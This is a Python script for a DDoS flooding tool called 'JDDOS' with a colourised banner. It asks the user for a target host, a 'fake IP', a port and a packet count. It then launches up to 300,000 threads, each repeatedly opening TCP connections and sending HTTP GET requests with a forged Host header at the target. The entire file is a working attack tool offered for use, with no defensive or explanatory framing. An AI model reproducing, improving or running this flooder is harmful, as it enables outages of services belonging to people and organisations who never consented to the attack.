from pystyle import Colors, Colorate
import socket
import os
import threading
import time

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()

def title():
    print(Colorate.Horizontal(Colors.red_to_blue,
    f"""
    d8,       d8b       d8b                 
  `8P        88P       88P                 
            d88       d88                  
  d88   d888888   d888888   d8888b  .d888b,
  ?88  d8P' ?88  d8P' ?88  d8P' ?88 ?8b,   
   88b 88b  ,88b 88b  ,88b 88b  d88   `?8b 
   `88b`?88P'`88b`?88P'`88b`?8888P'`?888P' 
    )88 ----------------------------------
   ,88P ||||||||||||-JxksDev-||||||||||||
`?888P ------------------------------------
    """))

while True:
    clear_screen()
    print(" ")
    try:
        target = input(Colorate.Horizontal(Colors.blue_to_purple, " [JDDOS] Target: "))
        if not target:
            raise ValueError(Colorate.Horizontal(Colors.blue_to_purple, " [JDDOS] Target cannot be empty!"))
            time.sleep(3)
        
        print(" ")
        fake_ip = input(Colorate.Horizontal(Colors.blue_to_purple, " [JDDOS] Fake IP: "))
        if not fake_ip:
            raise ValueError(Colorate.Horizontal(Colors.blue_to_purple, " [JDDOS] Fake IP cannot be empty!"))
            time.sleep(3)
        
        print(" ")
        port = int(input(Colorate.Horizontal(Colors.blue_to_purple, " [JDDOS] Port: ")))
        print(" ")
        num_of_packets = int(input(Colorate.Horizontal(Colors.blue_to_purple, " [JDDOS] Number Of Packets: ")))
        
        if num_of_packets > 300000:
            num_of_packets = 300000
            print(" ")
            print(Colorate.Horizontal(Colors.red_to_yellow, " [JDDOS] Maximum number of packets exceeded. Sending 300,000 packets."))
            time.sleep(3)
            
        attack_num = 0
        last_attack_time = time.time()
        stop_event = threading.Event()

        def attack():
            global attack_num, last_attack_time
            while not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendall(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
                    s.sendall(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
                    
                    attack_num += 1
                    last_attack_time = time.time()
                    s.close()
                except Exception as e:
                    print(" ")
                    print(Colorate.Horizontal(Colors.red_to_yellow, f" [JDDOS] Failed to send packet!"))
                    if time.time() - last_attack_time > 5:
                        break

        threads = []
        for i in range(num_of_packets):
            thread = threading.Thread(target=attack)
            thread.start()
            threads.append(thread)
            print(" ")
            print(Colorate.Horizontal(Colors.blue_to_purple, f" [JDDOS] Packet {i+1} Sent Succesfully!."))

        time.sleep(5)
        stop_event.set()

        for thread in threads:
            thread.join()
        print(" ")
        print(Colorate.Horizontal(Colors.green_to_cyan, " [JDDOS] All Packets Requested Have Been Sent!"))
        time.sleep(2)
    except ValueError as ve:
        print(" ")
        print(Colorate.Horizontal(Colors.red_to_yellow, f" [JDDOS] Error: {ve}"))
        time.sleep(3)
    except KeyboardInterrupt:
        print(" ")
        print(Colorate.Horizontal(Colors.red_to_yellow, "\n [JDDOS] Keyboard Interrupt detected. Exiting..."))
        time.sleep(3)
        break
